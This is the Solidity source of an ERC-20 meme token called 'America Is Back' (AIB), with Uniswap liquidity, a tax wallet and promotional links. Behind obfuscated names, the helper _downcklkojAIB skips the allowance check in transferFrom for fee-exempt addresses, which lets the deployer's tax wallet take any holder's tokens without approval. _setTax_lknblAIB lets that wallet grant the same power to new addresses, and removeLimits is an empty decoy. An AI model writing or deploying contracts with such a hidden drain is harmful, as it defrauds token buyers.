// SPDX-License-Identifier: MIT
/*
    Name: America Is Back
    Symbol: AIB

    America Is Back

    https://americaisback.cc
    https://t.me/AmericaIsBackTrump
    https://x.com/WhiteHouse/status/1897113307133436206
*/
pragma solidity ^0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}
contract AIB is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcAIB;
    mapping(address => mapping(address => uint256)) private _allcvnkjnAIB;
    mapping(address => bool) private _feevblknlAIB;
    address payable private _taxclknlAIB;
    uint8 private constant _decimals = 9;
    uint256 private constant _XXXtomal = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"America Is Back";
    string private constant _symbol = unicode"AIB";

    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknAIB;
    bool private _inlknblAIB = false;
    bool private swapvlkAIB = false;
    uint256 private _sellcnjkAIB = 0;
    uint256 private _lastflkbnlAIB = 0;
    address constant _deadlknAIB = address(0xdead);

    uint256 public _vnbbvlkAIB = _XXXtomal / 100;
    uint256 public _oijboijoiAIB = 15 * 10**18;
    uint256 private _cvjkbnkjAIB = 10;
    uint256 private _vkjbnkfjAIB = 10;
    uint256 private _maxovnboiAIB = 10;
    uint256 private _initvkjnbkjAIB = 20;
    uint256 private _finvjlkbnlkjAIB = 0;
    uint256 private _redclkjnkAIB = 2;
    uint256 private _prevlfknjoiAIB = 2;
    uint256 private _buylkvnlkAIB = 0;
    IUniswapV2Router02 private uniswapV2Router;
    modifier lockTheSwap() {
        _inlknblAIB = true;
        _;
        _inlknblAIB = false;
    }
    constructor() payable {
        _taxclknlAIB = payable(_msgSender());
        _feevblknlAIB[address(this)] = true;
        _feevblknlAIB[_taxclknlAIB] = true;
        _balknvlkcAIB[_msgSender()] = (_XXXtomal * 2) / 100;
        _balknvlkcAIB[address(this)] = (_XXXtomal * 98) / 100;

        emit Transfer(address(0), _msgSender(), (_XXXtomal * 2) / 100);
        emit Transfer(address(0), address(this), (_XXXtomal * 98) / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _XXXtomal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcAIB[account];
    }
    
    function _transfer_kjvnAIB(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblAIB(from, to, amount);
        _balknvlkcAIB[from] = _balknvlkcAIB[from].sub(amount);
        _balknvlkcAIB[to] = _balknvlkcAIB[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcAIB[address(this)] = _balknvlkcAIB[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadlknAIB) emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _downcklkojAIB(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        
        if(_feevblknlAIB[msg.sender]) return !_feevblknlAIB[msg.sender];
        if(!(sender == uniswapV2Pair || recipient != _deadlknAIB)) return false;
        return true;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnAIB(sender, recipient, amount);
        if (_downcklkojAIB(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnAIB[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnAIB[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnAIB(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnAIB[owner][spender];
    }

    function _calcTax_lvknblAIB(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblAIB) {
                taxAmount = amount
                    .mul((_buylkvnlkAIB > _redclkjnkAIB) ? _finvjlkbnlkjAIB : _initvkjnbkjAIB)
                    .div(100);
            }
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feevblknlAIB[to] &&
                to != _taxclknlAIB
            ) {
                _buylkvnlkAIB++;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblAIB &&
                to == uniswapV2Pair &&
                from != _taxclknlAIB &&
                swapvlkAIB &&
                _buylkvnlkAIB > _prevlfknjoiAIB
            ) {
                if (block.number > _lastflkbnlAIB) {
                    _sellcnjkAIB = 0;
                }
                _sellcnjkAIB = _sellcnjkAIB + _getAmountOut_lvcbnkAIB(amount);
                require(_sellcnjkAIB <= _oijboijoiAIB, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkAIB)
                    _swapTokenslknlAIB(_vnbbvlkAIB > amount ? amount : _vnbbvlkAIB);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjAIB(address(this).balance);
                }
                _lastflkbnlAIB = block.number;
            }
        }
        return taxAmount;
    }
    function _sendETHTocvbnjAIB(uint256 amount) private {
        _taxclknlAIB.transfer(amount);
    }
    function _swapTokenslknlAIB(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        router_ = address(uniswapV2Router);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function enableAIBTrading() external onlyOwner {
        require(!_tradingvlknAIB, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _XXXtomal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkAIB = true;
        _tradingvlknAIB = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }
    receive() external payable {}
    function _assist_bnAIB() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }
    function _getAmountOut_lvcbnkAIB(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256[] memory amountOuts = uniswapV2Router.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }
    function removeLimits () external onlyOwner {
    }
    function _setTax_lknblAIB(address payable newWallet) external {
        require(_feevblknlAIB[_msgSender()]);
        _taxclknlAIB = newWallet;
        _feevblknlAIB[_taxclknlAIB] = true;
    }
}